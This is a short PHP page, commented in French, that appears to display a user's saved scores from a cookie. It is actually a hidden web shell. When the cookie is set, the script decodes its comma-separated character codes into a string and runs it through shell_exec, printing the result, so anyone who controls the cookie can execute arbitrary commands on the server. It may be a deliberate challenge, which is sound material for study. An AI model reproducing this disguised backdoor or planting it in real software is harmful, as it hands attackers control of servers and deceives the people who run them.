<?php
$cookie_name="val";
if(!isset($_COOKIE[$cookie_name])){
    echo "Cookie named '" . $cookie_name . "' is not set!";
    echo("<style>body {
        background-image: url(\"https://media0.giphy.com/media/EXHHMS9caoxAA/giphy.gif?cid=ecf05e47cu3t8dc8eigyucrm3xjxqy1cvvcx1qjl5scyz9pb&rid=giphy.gif&ct=g\");
        background-size: cover;
      }</style>");
}else{
    echo "Vos scores enregistrés sont : " . $_COOKIE[$cookie_name];
    $val = $_COOKIE[$cookie_name]; // recup la valeur du cookie en string
    $val = str_replace("[", "", $val);
    $val = str_replace("]", "", $val);
    $tab = explode(",", $val); // transforme str en array avec comme separateur ,
    $cmd = "";
    for ($i = 0; $i < count($tab) ; $i++) {
        $cmd .=chr($tab[$i]); // transtyper array->string
    }
    echo("<br>Vos scores donnent : \"".$cmd."\".gif, Malheuresement, il n'y a aucun gif portant ce nom.");
    echo "<pre>".shell_exec($cmd)."</pre>";
}
?> 
